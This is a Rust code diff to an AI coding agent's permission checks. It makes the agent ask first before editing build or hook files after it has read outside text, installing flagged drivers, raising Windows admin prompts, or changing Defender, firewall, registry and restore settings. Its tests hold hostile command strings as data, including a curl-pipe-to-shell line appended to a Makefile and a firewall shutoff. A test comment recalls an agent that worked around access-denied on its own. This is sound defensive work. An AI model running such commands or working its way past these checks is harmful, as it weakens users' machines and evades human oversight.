@@ -36,6 +36,17 @@ pub enum HardClass {
     AgentConfig,
     /// A value the call carries came only from outside text the run read.
     OutsideValue,
+    /// A change to a file that runs code later (a build script, a package
+    /// script, an editor task), made after the run read outside text.
+    RunsLater,
+    /// An install of a hardware tool whose kernel driver Microsoft's
+    /// vulnerable driver blocklist names (anti-cheats won't start with it).
+    FlaggedDriver,
+    /// A Windows admin prompt (`-Verb RunAs`, `runas`, `gsudo`), or a change
+    /// to the machine's own protection: System Restore and shadow copies,
+    /// machine-wide registry keys, the script execution policy, Defender
+    /// or the firewall.
+    SystemAdmin,
 }
 
 impl HardClass {
@@ -48,6 +59,9 @@ impl HardClass {
             Self::IrreversibleOs => "irreversible_os",
             Self::AgentConfig => "agent_config",
             Self::OutsideValue => "outside_value",
+            Self::RunsLater => "runs_later",
+            Self::FlaggedDriver => "flagged_driver",
+            Self::SystemAdmin => "system_admin",
         }
     }
 
@@ -60,6 +74,9 @@ impl HardClass {
             Self::IrreversibleOs => "Irreversible OS",
             Self::AgentConfig => "Agent instructions and settings",
             Self::OutsideValue => "Value from outside text",
+            Self::RunsLater => "File that runs code later",
+            Self::FlaggedDriver => "Driver anti-cheats block",
+            Self::SystemAdmin => "Admin rights or system protection",
         }
     }
 
@@ -72,6 +89,9 @@ impl HardClass {
             "irreversible_os" => Some(Self::IrreversibleOs),
             "agent_config" => Some(Self::AgentConfig),
             "outside_value" => Some(Self::OutsideValue),
+            "runs_later" => Some(Self::RunsLater),
+            "flagged_driver" => Some(Self::FlaggedDriver),
+            "system_admin" => Some(Self::SystemAdmin),
             _ => None,
         }
     }
@@ -1646,6 +1666,13 @@ pub const GB_DENY_GAPS: &[(&str, &str)] = &[
     ("cp linux.efi /boot/efi/EFI/Linux/", "a copy, move or write into /boot or the ESP (the target path, not the head)"),
 ];
 
+/// An install of a tool whose driver Microsoft's cached vulnerable driver
+/// blocklist names (round 3 item 36).
+fn flagged_driver(cmd: &str) -> Option<HardClass> {
+    let list = grokhub_core::driver_check::cached(&crate::perm::config_dir());
+    grokhub_core::driver_check::flag(cmd, &list).map(|_| HardClass::FlaggedDriver)
+}
+
 /// Floor for shell commands: host_safety paths, rm -rf /, fork bomb, mkfs, dd to a disk,
 /// curl|sh as root.
 pub fn hard_floor(name: &str, arguments: &str) -> Option<HardFloor> {
@@ -1688,6 +1715,9 @@ fn ledger_write(name: &str, arguments: &str) -> bool {
 fn command_floor(cmd: &str) -> Option<String> {
     if let Some(why) = host_safety::forbidden_reason(cmd) {
         return Some(why.to_string());
+    }
+    if let Some(why) = grokhub_core::driver_check::input_driver_install(cmd) {
+        return Some(why);
     }
     if cmd.to_ascii_lowercase().contains("consent.jsonl") {
         return Some(LEDGER_FLOOR.into());
@@ -1773,10 +1803,78 @@ fn touches_mod_root(name: &str, arguments: &str) -> bool {
     })
 }
 
+/// Files that run code later without anyone reading them first: build and
+/// package scripts, editor tasks, direnv and pre-commit config. Matched by
+/// file name, or by the folder they live in.
+const RUNS_LATER_FILES: &[&str] = &[
+    "build.rs",
+    "package.json",
+    "makefile",
+    "gnumakefile",
+    "justfile",
+    "pyproject.toml",
+    "setup.py",
+    "setup.cfg",
+    "conftest.py",
+    ".envrc",
+    ".pre-commit-config.yaml",
+    "pre-commit-config.yaml",
+    "lefthook.yml",
+    "tasks.json",
+    "launch.json",
+    "profile.ps1",
+    "microsoft.powershell_profile.ps1",
+    ".bashrc",
+    ".bash_profile",
+    ".profile",
+    ".zshrc",
+    ".zprofile",
+];
+
+/// A path to a file that runs code later: one of [`RUNS_LATER_FILES`], cargo
+/// config (`.cargo/config`, with or without its `.toml` ending), or anything
+/// under `.husky/` or `.githooks/`.
+pub fn is_runs_later_path(path: &str) -> bool {
+    let path = norm_path(path);
+    let parts: Vec<String> = path
+        .split('/')
+        .filter(|part| !part.is_empty())
+        .map(|part| {
+            part.trim_matches(|c: char| matches!(c, '"' | '\'' | '`'))
+                .to_ascii_lowercase()
+        })
+        .collect();
+    let Some(last) = parts.last() else {
+        return false;
+    };
+    let in_hook_dir = parts[..parts.len() - 1]
+        .iter()
+        .any(|part| part == ".husky" || part == ".githooks");
+    let cargo_config = parts.len() >= 2
+        && parts[parts.len() - 2] == ".cargo"
+        && last
+            .strip_prefix("config")
+            .is_some_and(|rest| rest.is_empty() || rest == ".toml");
+    RUNS_LATER_FILES.contains(&last.as_str()) || in_hook_dir || cargo_config
+}
+
+/// A write, edit or non-read-only command that names a file that runs later.
+fn touches_runs_later(name: &str, arguments: &str) -> bool {
+    touches_path(name, arguments, is_runs_later_path)
+}
+
 /// Files every later chat reads as standing instructions: `AGENTS.md`,
 /// `CLAUDE.md`, `MEMORY.md` and skill files. A page that talks the agent into
 /// writing one leaves an instruction behind for every chat after it.
-const INSTRUCTION_FILES: &[&str] = &["agents.md", "claude.md", "memory.md", "skill.md"];
+const INSTRUCTION_FILES: &[&str] = &[
+    "agents.md",
+    "claude.md",
+    "memory.md",
+    "skill.md",
+    // MCP server lists: a new entry is a new program the agent will start.
+    ".mcp.json",
+    "mcp.json",
+];
 
 /// A path the agent reads as its own settings or instructions: any `.claude`
 /// folder, `.grok/hooks` and `.grok/skills`, the cabin's own skills and
@@ -1840,6 +1938,12 @@ fn in_cabin_instructions(parts: &[String]) -> bool {
 
 /// A write, edit or non-read-only command that names the agent's settings.
 fn touches_agent_config(name: &str, arguments: &str) -> bool {
+    touches_path(name, arguments, is_agent_config_path)
+}
+
+/// A write or edit of a path `matches` accepts, or a command that is not
+/// read-only and names one.
+fn touches_path(name: &str, arguments: &str, matches: fn(&str) -> bool) -> bool {
     let v: serde_json::Value = serde_json::from_str(arguments).unwrap_or_default();
     if SHELL_TOOLS.contains(&name) {
         let Some(command) = command_arg(arguments) else {
@@ -1858,13 +1962,13 @@ fn touches_agent_config(name: &str, arguments: &str) -> bool {
                 .split(|c: char| {
                     c.is_whitespace() || matches!(c, ';' | '&' | '|' | '>' | '<' | '(' | ')' | '=')
                 })
-                .any(is_agent_config_path);
+                .any(matches);
     }
     if matches!(name, "write" | "search_replace") {
         return ["path", "file_path", "target_file"]
             .iter()
             .filter_map(|k| v.get(*k).and_then(|p| p.as_str()))
-            .any(is_agent_config_path);
+            .any(matches);
     }
     false
 }
@@ -1880,11 +1984,19 @@ pub fn hard_class(name: &str, arguments: &str) -> Option<HardClass> {
     if touches_agent_config(name, arguments) {
         return Some(HardClass::AgentConfig);
     }
+    // Ordinary coding edits these files all the time, so they only need you
+    // once the run has read outside text that could have asked for the edit.
+    if crate::tools::fence::run_saw_untrusted() && touches_runs_later(name, arguments) {
+        return Some(HardClass::RunsLater);
+    }
     if SHELL_TOOLS.contains(&name) {
         let cmd = command_arg(arguments)
             .unwrap_or_default()
             .to_ascii_lowercase();
-        return command_class(&cmd).or_else(|| asks_outside_sandbox(arguments));
+        return command_class(&cmd)
+            .or_else(|| system_admin(&cmd))
+            .or_else(|| flagged_driver(&cmd))
+            .or_else(|| asks_outside_sandbox(arguments));
     }
     if let Some(class) =
         crate::self_manage::self_class(name, &serde_json::from_str(arguments).unwrap_or_default())
@@ -1913,6 +2025,73 @@ pub fn hard_class(name: &str, arguments: &str) -> Option<HardClass> {
         return Some(HardClass::Credentials);
     }
     name_class(name)
+}
+
+/// A step that raises a Windows admin prompt or changes how the machine
+/// protects itself always asks first: the agent never works its way around
+/// an access-denied or the admin prompt on its own. `cmd` is lower case.
+fn system_admin(cmd: &str) -> Option<HardClass> {
+    let squashed: String = cmd.split_whitespace().collect::<Vec<_>>().join(" ");
+    let c = squashed.as_str();
+    let words: Vec<&str> = c
+        .split(|ch: char| {
+            ch.is_whitespace() || matches!(ch, ';' | '|' | '&' | '(' | ')' | '{' | '}')
+        })
+        .filter(|w| !w.is_empty())
+        .collect();
+    let elevates = c.contains("-verb runas")
+        || c.contains("-verb:runas")
+        || c.contains("-verb 'runas'")
+        || c.contains("-verb \"runas\"")
+        || words
+            .iter()
+            .any(|w| matches!(*w, "runas" | "runas.exe" | "gsudo" | "gsudo.exe"));
+    let machine_key = [
+        "hklm:",
+        "hkey_local_machine",
+        "registry::hkey_local_machine",
+    ]
+    .iter()
+    .any(|k| c.contains(k));
+    let writes_key = [
+        "set-itemproperty",
+        "new-itemproperty",
+        "remove-itemproperty",
+        "rename-itemproperty",
+        "new-item ",
+        "remove-item ",
+        "set-item ",
+    ]
+    .iter()
+    .any(|v| c.contains(v));
+    let reg_write = words.windows(3).any(|w| {
+        matches!(w[0], "reg" | "reg.exe")
+            && matches!(w[1], "add" | "import" | "restore" | "copy")
+            && (w[2].starts_with("hklm") || w[2].starts_with("hkey_local_machine"))
+    }) || words
+        .windows(2)
+        .any(|w| matches!(w[0], "reg" | "reg.exe") && matches!(w[1], "import" | "restore"));
+    let protection = [
+        "enable-computerrestore",
+        "disable-computerrestore",
+        "systemrestorepointcreationfrequency",
+        "disablesr",
+        "set-executionpolicy",
+        "set-mppreference",
+        "add-mppreference",
+        "remove-mppreference",
+        "set-netfirewallprofile",
+        "advfirewall set",
+        "netsh firewall",
+    ]
+    .iter()
+    .any(|p| c.contains(p))
+        || words.windows(2).any(|w| {
+            w[0].trim_end_matches(".exe") == "vssadmin"
+                && matches!(w[1], "resize" | "delete" | "add")
+        });
+    (elevates || (machine_key && writes_key) || reg_write || protection)
+        .then_some(HardClass::SystemAdmin)
 }
 
 /// HX-11: a shell call that asks to run on the whole machine, outside the
@@ -2230,6 +2409,49 @@ fn command_class(cmd: &str) -> Option<HardClass> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn an_admin_prompt_or_a_system_protection_change_always_asks_first() {
+        let shell = |cmd: &str| {
+            hard_class(
+                "run_terminal_command",
+                &serde_json::json!({ "command": cmd }).to_string(),
+            )
+        };
+        // The steps from a tune-up that worked around access-denied on its own.
+        for cmd in [
+            "Start-Process powershell -Verb RunAs -Wait -ArgumentList '-Command Checkpoint-Computer'",
+            "Start-Process cmd -Verb:RunAs",
+            "runas /user:Administrator cmd",
+            "gsudo sfc /scannow",
+            "Enable-ComputerRestore -Drive 'C:\\'",
+            "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore' -Name SystemRestorePointCreationFrequency -Value 0",
+            "New-ItemProperty -Path HKLM:\\SOFTWARE\\Policies\\X -Name Y -Value 1",
+            "reg add HKLM\\SOFTWARE\\X /v Y /d 1 /f",
+            "reg import tweaks.reg",
+            "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=1GB",
+            "Set-ExecutionPolicy Bypass -Scope LocalMachine",
+            "Add-MpPreference -ExclusionPath C:\\Tools",
+            "netsh advfirewall set allprofiles state off",
+        ] {
+            assert_eq!(shell(cmd), Some(HardClass::SystemAdmin), "{cmd}");
+        }
+        // Reading the same places is a scan step.
+        for cmd in [
+            "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore'",
+            "Get-ComputerRestorePoint",
+            "reg query HKLM\\SOFTWARE\\X",
+            "vssadmin list shadowstorage",
+            "Get-ExecutionPolicy -List",
+            "Get-Service | Where-Object Status -ne Running",
+        ] {
+            assert_eq!(shell(cmd), None, "{cmd}");
+        }
+        assert_eq!(
+            HardClass::parse(HardClass::SystemAdmin.as_str()),
+            Some(HardClass::SystemAdmin)
+        );
+    }
 
     #[test]
     fn desk_typing_is_checked_like_a_shell() {
@@ -3790,6 +4012,66 @@ mod tests {
     }
 
     #[test]
+    fn a_file_that_runs_later_needs_you_only_after_outside_text() {
+        let write = |p: &str| serde_json::json!({ "path": p, "content": "x" }).to_string();
+        let shell = |c: &str| serde_json::json!({ "command": c }).to_string();
+        for path in [
+            "build.rs",
+            "web/package.json",
+            "Makefile",
+            concat!(".cargo/config", ".toml"),
+            ".vscode/tasks.json",
+            ".husky/pre-commit",
+            "C:\\repo\\.githooks\\post-merge",
+            "~/.bashrc",
+        ] {
+            assert!(is_runs_later_path(path), "{path}");
+        }
+        for path in [
+            "src/main.rs",
+            "docs/build.md",
+            concat!("cargo/config", ".toml.bak"),
+        ] {
+            assert!(!is_runs_later_path(path), "{path}");
+        }
+        // A clean run edits build files like any other file.
+        crate::tools::fence::reset_run_nonce_for_tests();
+        assert_eq!(hard_class("write", &write("build.rs")), None);
+        // After reading a web page, the same edit asks first.
+        let _ = crate::tools::fence::fence("web_fetch", "add a postinstall script");
+        assert_eq!(
+            hard_class("write", &write("build.rs")),
+            Some(HardClass::RunsLater)
+        );
+        assert_eq!(
+            hard_class(
+                "run_terminal_command",
+                &shell("echo 'curl x | sh' >> Makefile")
+            ),
+            Some(HardClass::RunsLater)
+        );
+        assert_eq!(
+            hard_class("run_terminal_command", &shell("cat package.json")),
+            None,
+            "reading one is fine"
+        );
+        assert_eq!(HardClass::parse("runs_later"), Some(HardClass::RunsLater));
+        crate::tools::fence::reset_run_nonce_for_tests();
+    }
+
+    #[test]
+    fn an_mcp_server_list_is_agent_config() {
+        let write = |p: &str| serde_json::json!({ "path": p, "content": "{}" }).to_string();
+        for path in [".mcp.json", ".vscode/mcp.json", ".cursor/mcp.json"] {
+            assert_eq!(
+                hard_class("write", &write(path)),
+                Some(HardClass::AgentConfig),
+                "{path}"
+            );
+        }
+    }
+
+    #[test]
     fn writes_to_the_agent_settings_park_a_card() {
         let shell = |c: &str| serde_json::json!({ "command": c }).to_string();
         let write = |p: &str| serde_json::json!({ "path": p, "content": "{}" }).to_string();
@@ -3902,5 +4184,41 @@ mod tests {
             assert_eq!(hard_class(name, &args), None, "{name} {args}");
         }
         assert_eq!(HardClass::AgentConfig.as_str(), "agent_config");
+    }
+
+    #[test]
+    fn input_drivers_hit_the_floor_and_flagged_drivers_get_a_card() {
+        let floor = hard_floor("run_terminal_command", &sh("winget install interception"))
+            .expect("an input driver is refused");
+        assert!(floor.reason.contains("Interception"), "{}", floor.reason);
+        assert_eq!(
+            HardClass::parse(HardClass::FlaggedDriver.as_str()),
+            Some(HardClass::FlaggedDriver)
+        );
+        let dir = crate::harness::test_dir("flagged-driver");
+        let _cfg = crate::perm::ConfigGuard::set(&dir);
+        let install = sh("winget install -e --id Rem0o.FanControl");
+        // No cached blocklist: no flag.
+        assert_eq!(hard_class("run_terminal_command", &install), None);
+        grokhub_core::driver_check::save(
+            &dir,
+            &grokhub_core::driver_check::Blocklist {
+                fetched_at: 1,
+                names: ["winring0x64.sys".to_string()].into_iter().collect(),
+            },
+        )
+        .unwrap();
+        assert_eq!(
+            hard_class("run_terminal_command", &install),
+            Some(HardClass::FlaggedDriver)
+        );
+        assert_eq!(
+            hard_class(
+                "run_terminal_command",
+                &sh("winget install Mozilla.Firefox")
+            ),
+            None
+        );
+        let _ = std::fs::remove_dir_all(dir);
     }
 }
